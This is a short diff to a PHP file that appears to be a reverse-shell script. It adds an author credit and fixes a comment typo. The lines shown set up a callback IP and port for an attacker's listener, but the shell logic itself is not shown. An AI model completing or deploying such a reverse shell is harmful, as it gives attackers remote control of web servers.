@@ -1,9 +1,10 @@
+//made and published by Patryk.P 
 <?php
 
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = '10.10.10.10'; //change to desired ip 
-$port = 9001; //chage to desired port 
+$port = 9001; //change to desired port 
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
